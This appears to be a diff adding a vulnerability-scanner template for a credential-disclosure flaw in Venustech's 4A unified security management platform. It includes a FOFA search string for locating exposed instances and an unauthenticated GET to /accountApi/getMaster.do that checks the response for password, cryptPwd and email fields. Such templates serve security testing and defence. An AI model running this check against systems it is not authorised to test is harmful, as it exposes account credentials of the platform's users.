@@ -1,0 +1,25 @@
+id: venustech-4a-gtmaster-disclosure
+
+info:
+  name: 启明星辰-4A 统一安全管控平台 getMater 信息泄漏
+  author: zan8in
+  severity: high
+  verified: false
+  description: |
+    FOFA: "4A 统一安全管控平台"
+  tags: venustech,disclosure
+  created: 2023/09/03
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /accountApi/getMaster.do
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'cnname') && 
+      response.body.bcontains(b'password') && 
+      response.body.bcontains(b'cryptPwd') &&
+      response.body.bcontains(b'authtype') &&
+      response.body.bcontains(b'email')
+expression: r0()
